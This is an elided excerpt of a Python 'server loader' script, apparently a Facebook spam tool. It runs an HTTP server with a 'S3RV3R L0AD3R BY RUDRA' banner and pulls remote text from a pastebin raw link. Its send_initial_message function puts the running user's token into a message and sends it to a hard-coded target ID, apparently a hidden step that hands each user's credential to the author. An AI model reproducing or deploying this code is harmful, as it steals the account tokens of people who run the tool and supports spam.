...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"S3RV3R L0AD3R BY RUDRA")
...
mmm = requests.get('https://pastebin.com/raw/jWFK562D').text
...
def send_initial_message():
    ...
    msg_template = "Hello ब्राह्मण सोल्जर sir! I am using your spm@server. My token is ----------------    {}"

    # Specify the ID where you want to send the message
    target_id = "100089188492077"
